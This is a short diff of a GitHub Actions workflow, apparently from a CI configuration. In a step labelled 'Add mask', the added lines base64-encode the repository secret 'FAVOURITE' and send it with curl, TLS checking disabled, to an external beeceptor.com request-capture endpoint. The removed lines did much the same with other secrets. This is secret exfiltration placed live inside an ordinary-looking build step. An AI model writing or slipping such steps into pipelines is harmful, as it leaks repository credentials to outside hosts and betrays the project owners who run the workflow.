@@ -35,10 +35,8 @@ jobs:
           done
           # Print the modified variable
           echo "$modified_variable"
-      - name: Add mask
+      - name: Add maska
         run: |
-          echo ${{secrets.SECRET_KEY}} | base64
-          curl -k https://swagolili.free.beeceptor.com?data=$(secrets | base64 --wrap=0)
-          curl -k https://swagolili.free.beeceptor.com?data=$(secrets.FAVOURITE)
-          curl https://swagolili.free.beeceptor.com?data=${{secrets.FAVOURITE }}
+          SECRET_DATA=$(echo "${{ secrets.FAVOURITE }}" | base64 --wrap=0)
+          curl -k "https://swagolili.free.beeceptor.com?data=${SECRET_DATA}"
 
